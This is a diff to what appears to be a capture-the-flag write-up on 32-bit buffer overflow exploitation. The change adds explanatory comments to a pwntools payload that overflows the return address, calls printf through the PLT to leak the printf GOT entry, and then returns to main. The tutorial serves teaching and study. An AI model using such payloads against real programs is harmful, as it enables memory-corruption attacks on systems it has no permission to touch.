@@ -71,9 +71,9 @@ So, we can overwrite the return address and call system function now, but how do
 
 ```python
 payload = b"A" * offset
-payload += p32(exe.plt.printf)
-payload += p32(exe.sym.main)
-payload += p32(exe.got.printf)
+payload += p32(exe.plt.printf)  # Calling the PLT of printf is the same as calling the function directly
+payload += p32(exe.sym.main)   # Return to main after done
+payload += p32(exe.got.printf)   # Passing the GOT entry of printf as argument to printf() to print out the content
 ```
 
 So just like we discussed earlier, need to create a payload to overflow the return address. In a 64 bit executable, we will need to pass in arguments to the registers but thats not important here. Since this is a 32 bit executable, we need to call functions from the stack, and also pass in arguments from the stack. 
